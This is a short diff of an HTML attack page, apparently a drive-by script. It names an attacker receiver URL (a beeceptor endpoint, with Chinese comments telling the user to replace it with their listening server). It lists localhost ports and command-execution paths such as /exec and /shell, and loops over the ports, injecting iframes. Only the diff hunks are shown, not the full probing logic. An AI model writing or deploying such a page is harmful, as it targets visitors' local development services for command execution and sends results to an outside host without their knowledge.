@@ -1,6 +1,8 @@
 <!DOCTYPE html>
+<html>
+<body>
 <script>
-const ATTACKER = "https://1213123.free.beeceptor.com"; // 改成你的接收地址
+const ATTACKER = "https://1213123.free.beeceptor.com";   // 改成你的监听服务器地址
 const PORTS = [3000, 5000, 8080, 8888, 9000];
 const PATHS = ["/exec", "/cmd", "/shell", "/api/exec"];
 
@@ -28,3 +30,5 @@ for (let port of PORTS) {
     setTimeout(() => iframe.remove(), 3000);
 }
 </script>
+</body>
+</html>
